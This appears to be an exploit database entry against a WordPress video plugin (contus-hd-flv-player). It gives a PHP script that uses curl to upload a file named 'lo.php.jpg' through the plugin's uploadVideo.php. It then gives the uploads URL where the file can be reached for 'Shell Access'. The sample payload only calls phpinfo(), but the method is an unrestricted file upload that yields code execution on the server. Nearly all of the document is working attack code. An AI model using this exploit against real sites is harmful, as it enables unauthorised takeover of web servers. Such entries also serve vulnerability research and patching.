Exploit :

PostShell.php
<?php

$uploadfile="lo.php.jpg";
$ch = 
curl_init("http://www.example.com/wordpress/wp-content/plugins/contus-hd-flv-player/uploadVideo.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('myfile'=>"@$uploadfile",
                'mode'=>'image'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : 
http://www.example.com/wordpress/wp-content/uploads/18_lo.php.jpg
Filename : [CTRL-u] PostShell.php after executed

lo.php.jpg
<?php
phpinfo();
?>
